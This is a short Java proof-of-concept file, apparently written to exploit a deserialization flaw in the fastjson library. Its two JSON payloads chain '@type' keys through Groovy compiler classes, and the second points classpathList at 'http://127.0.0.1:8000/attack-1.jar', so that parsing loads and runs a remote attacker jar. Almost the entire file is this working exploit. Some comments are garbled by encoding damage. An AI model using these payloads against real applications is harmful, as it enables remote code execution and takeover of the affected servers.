package com.example.demo.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class FastJsonTest {
    public static void main(String[] args) {
        // if enable, <1.2.76 can be exploited
        // 全局启用 AutoType
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String json ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{\n" +
                "  }\n" +
                "}";

        try {
            // �����л���org.codehaus.groovy.control.ProcessingUnit ���������
            JSON.parse(json);
        } catch (Exception e) {
            //e.printStackTrace();
        }

        json =
                "{\n" +
                        "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                        "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                        "  \"config\":{\n" +
                        "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                        "    \"classpathList\":[\"http://127.0.0.1:8000/attack-1.jar\"]\n" +
                        "  },\n" +
                        "  \"gcl\":null,\n" +
                        "  \"destDir\": \"/tmp\"\n" +
                        "}";
        // �����л���ִ��
        JSON.parse(json);


    }
}
